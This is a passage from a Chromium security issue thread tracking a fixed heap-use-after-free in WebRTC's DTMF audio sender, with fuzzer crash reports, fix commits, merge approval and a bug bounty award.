Detailed report: https://clusterfuzz.com/testcase?key=4916778552262656

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x616000084680
Crash State:
  rtc::FunctorMessageHandler<bool, webrtc::AudioRtpSender::CanInsertDtmf
  jingle_glue::JingleThreadWrapper::Dispatch
  jingle_glue::JingleThreadWrapper::ProcessPendingSends
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=538781:538782
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=544346:544347

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4916778552262656

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2018-03-21)

ClusterFuzz has detected this issue as fixed in range 544346:544347.

Detailed report: https://clusterfuzz.com/testcase?key=5349464630624256

Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x616000084680
Crash State:
  rtc::FunctorMessageHandler<bool, webrtc::AudioRtpSender::CanInsertDtmf
  jingle_glue::JingleThreadWrapper::Dispatch
  jingle_glue::JingleThreadWrapper::ProcessPendingSends
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=538781:538782
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=544346:544347

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5349464630624256

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2018-03-21)

ClusterFuzz testcase 4916778552262656 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2018-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-03-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/1bb872609e1d1a7b4d992b58dea4d2727f3bc93a

commit 1bb872609e1d1a7b4d992b58dea4d2727f3bc93a
Author: Harald Alvestrand <hta@chromium.org>
Date: Wed Mar 21 19:36:22 2018

Test that DTMFSender rejects properly after close

This verifies that the sender throws the right error
when called after the connection closing.

Bug: chromium:822799
Change-Id: Id3ab4ddc65b1510526fa49b7bfe3f9f95a7f2d65
Reviewed-on: https://chromium-review.googlesource.com/968927
Reviewed-by: Henrik Boström <hbos@chromium.org>
Commit-Queue: Harald Alvestrand <hta@chromium.org>
Cr-Commit-Position: refs/heads/master@{#544804}
[modify] https://crrev.com/1bb872609e1d1a7b4d992b58dea4d2727f3bc93a/third_party/WebKit/LayoutTests/external/wpt/webrtc/RTCDTMFSender-insertDTMF.https-expected.txt
[modify] https://crrev.com/1bb872609e1d1a7b4d992b58dea4d2727f3bc93a/third_party/WebKit/LayoutTests/external/wpt/webrtc/RTCDTMFSender-insertDTMF.https.html


### sh...@chromium.org (2018-03-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-03-24)

This bug requires manual review: DEPS changes referenced in bugdroid comments.
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), josafat@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ab...@chromium.org (2018-03-26)

Can you please specify which CL needs to be merged?

### aw...@google.com (2018-03-26)

[Empty comment from Monorail migration]

### st...@chromium.org (2018-03-27)

The CL that needs to be merged is a WebRTC CL: https://webrtc-review.googlesource.com/c/src/+/62941

### ab...@chromium.org (2018-03-27)

Approving merge for M66. Branch:3359

### aw...@chromium.org (2018-04-01)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-04-01)

Nice one! The VRP Panel decided to award $5,000 for this report. Cheers!

### aw...@google.com (2018-04-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-04-02)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2018-04-03)

The following revision refers to this bug:
  https://webrtc.googlesource.com/src.git/+/a1ad1c530d8490e71a2805374882feabd8af5632

commit a1ad1c530d8490e71a2805374882feabd8af5632
Author: Harald Alvestrand <hta@webrtc.org>
Date: Tue Apr 03 06:45:43 2018

Discard link to media channel when audio sender stopped.

TBR=hta@webrtc.org

(cherry picked from commit 3d976f60666c0d800f9112edbae7c93bee99acd7)

Bug: chromium:822799
Change-Id: Ib863cf048318b04369cc51ed1b1c8b03010a2fd2
Reviewed-on: https://webrtc-review.googlesource.com/62941
Commit-Queue: Harald Alvestrand <hta@webrtc.org>
Reviewed-by: Steve Anton <steveanton@webrtc.org>
Cr-Original-Commit-Position: refs/heads/master@{#22503}
Reviewed-on: https://webrtc-review.googlesource.com/66320
Reviewed-by: Harald Alvestrand <hta@webrtc.org>
Cr-Commit-Position: refs/branch-heads/66@{#17}
Cr-Branched-From: 12c8110e8c717b7f0f87615d3b99caac2a69fa6c-refs/heads/master@{#22215}
[modify] https://crrev.com/a1ad1c530d8490e71a2805374882feabd8af5632/pc/rtpsender.cc


### bu...@chromium.org (2018-04-03)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/de05c7c58226803675ba8b98638f328aa22ebc56

commit de05c7c58226803675ba8b98638f328aa22ebc56
Author: Harald Alvestrand <hta@chromium.org>
Date: Tue Apr 03 17:17:16 2018

Don't enforce name rule for RTCDTMFToneChangeEvent

Since the constructor of RTCDTMFToneChangeEvent is exposed,
creating such events with other names than "tonechange" is possible.
No reason to discriminate against such.

Also adds tests for constructor.

Bug: chromium:822799
Change-Id: I4b36f3094acee200dd4200c4d24f6b46e10a06e6
Reviewed-on: https://chromium-review.googlesource.com/992038
Reviewed-by: Guido Urdaneta <guidou@chromium.org>
Commit-Queue: Harald Alvestrand <hta@chromium.org>
Cr-Commit-Position: refs/heads/master@{#547742}
[modify] https://crrev.com/de05c7c58226803675ba8b98638f328aa22ebc56/third_party/WebKit/LayoutTests/external/wpt/webrtc/RTCDTMFSender-ontonechange.https-expected.txt
[modify] https://crrev.com/de05c7c58226803675ba8b98638f328aa22ebc56/third_party/WebKit/LayoutTests/external/wpt/webrtc/RTCDTMFSender-ontonechange.https.html
[modify] https://crrev.com/de05c7c58226803675ba8b98638f328aa22ebc56/third_party/WebKit/Source/modules/peerconnection/RTCDTMFToneChangeEvent.cpp


### ht...@chromium.org (2018-04-03)

CL in #35 was marked with the wrong issue, should have been https://crbug.com/825571.

### ab...@chromium.org (2018-04-03)

[Empty comment from Monorail migration]

### aw...@google.com (2018-04-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-06-27)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2018-06-27)

This issue was migrated from crbug.com/chromium/822799?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40090823)*
